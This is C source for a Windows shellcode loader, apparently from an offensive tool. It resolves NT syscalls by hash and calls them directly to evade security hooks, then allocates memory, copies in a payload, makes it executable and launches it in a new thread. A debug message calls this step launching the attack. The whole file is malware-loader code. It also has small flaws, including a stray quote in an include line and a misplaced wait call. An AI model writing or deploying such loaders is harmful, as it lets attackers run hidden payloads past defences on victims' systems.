#include "common_injection.h"
#include "macros.h"
#include "winapi.h"'
#include <windows.h>

extern NT_API g_NT_API;
extern NT_CONFIG g_NT_CONFIG;

int CheckLaunchConfig() {
    if (!g_NT_API.NtAllocateVirtualMemory.pSyscallAddress ||
        !g_NT_API.NtProtectVirtualMemory.pSyscallAddress ||
        !g_NT_API.NtCreateThreadEx.pSyscallAddress) {

        if (!InitNtSyscall(
                &g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
                S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory)) ||
            !InitNtSyscall(
                &g_NT_CONFIG, NtProtectVirtualMemory_Hash,
                S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory)) ||
            !InitNtSyscall(&g_NT_CONFIG, NtCreateThreadEx_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.NtCreateThreadEx)))
            return 0;
    }
    if (!g_NT_API.NtWaitForSingleObject.pSyscallAddress) {
        if (!InitNtSyscall(&g_NT_CONFIG, NtWaitForSingleObject_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.NtWaitForSingleObject)))
            return 0;
    }
#ifdef DEBUG
    PRINTA("[+] Lanuch Configure Success\n");
#endif
    return 1;
}
int Launch(void *pBuffer, int dwBufferSize) {

    if (pBuffer == NULL || dwBufferSize == 0x00) return 0;
    if (!CheckLaunchConfig()) return 0;

    NTSTATUS STATUS = 0;
    DWORD dwOld = 0;
    PVOID pAddress = 0;
    SIZE_T sSize = (SIZE_T)dwBufferSize;
    HANDLE hThread = NULL;

    CONFIGURE_SYSCALL(g_NT_API.NtAllocateVirtualMemory);
#ifdef DEBUG
    PRINTA("[i] Will allocate size : %d\n", dwBufferSize);
#endif
    if (SysCall(NtCurrentProcess(), &pAddress, 0, &sSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
        return 0;
#ifdef DEBUG
    PRINTA("[+] Allocate at : %p\n", pAddress);
    PRINTA("[i] Size : %d\n", sSize);
#endif
    memcpy(pAddress, pBuffer, dwBufferSize);
    CONFIGURE_SYSCALL(g_NT_API.NtProtectVirtualMemory);
    if (SysCall(NtCurrentProcess(), &pAddress, &sSize, PAGE_EXECUTE_READ,
                &dwOld))
        return 0;
#ifdef DEBUG
    PRINTA("[+] ReConfigure mem permission done, lanuch attack\n");
#endif
    CONFIGURE_SYSCALL(g_NT_API.NtCreateThreadEx);
    if (SysCall(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), pAddress,
                NULL, FALSE, NULL, NULL, NULL, NULL))
        CONFIGURE_SYSCALL(g_NT_API.NtWaitForSingleObject);
    if (!SysCall(NtCurrentThread(), FALSE, NULL)) return 0;
    return 0;
}

